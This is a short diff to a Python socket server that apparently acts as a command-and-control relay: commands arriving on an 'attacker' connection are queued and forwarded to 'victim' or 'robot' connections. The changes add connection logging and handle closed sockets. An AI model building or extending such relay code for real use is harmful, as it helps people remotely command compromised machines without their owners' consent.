@@ -9,6 +9,7 @@ cmd_queue = Queue()
 
 
 def handle_victim_conn(s: socket.socket):
+    print("Opened robot connection")
     global cmd_queue
 
     while True:
@@ -19,19 +20,27 @@ def handle_victim_conn(s: socket.socket):
                 s.send(cmd)
         except ConnectionResetError as e:
             s.close()
+            print("Closed robot connection")
             return
 
 
 def handle_attacker_conn(att_conn: socket.socket):
+    print("Opened handler connection")
     global cmd_queue
 
     while True:
         try:
             cmd_got = att_conn.recv(CMD_SIZE)
+            if cmd_got == b'':
+                att_conn.close()
+                print("Closed handler connection")
+                return
             print(f'Got command {cmd_got}')
             cmd_queue.put(cmd_got)
         except ConnectionResetError as e:
+            print('Exception:',e)
             att_conn.close()
+            print("Closed handler connection")
             return
 
 
@@ -49,8 +58,6 @@ if __name__ == '__main__':
             #     continue
 
             (conn, addr) = server_socket.accept()
-
-            conn_num += 1
 
             conn_input = (conn.recv(ID_LEN)).decode()
 
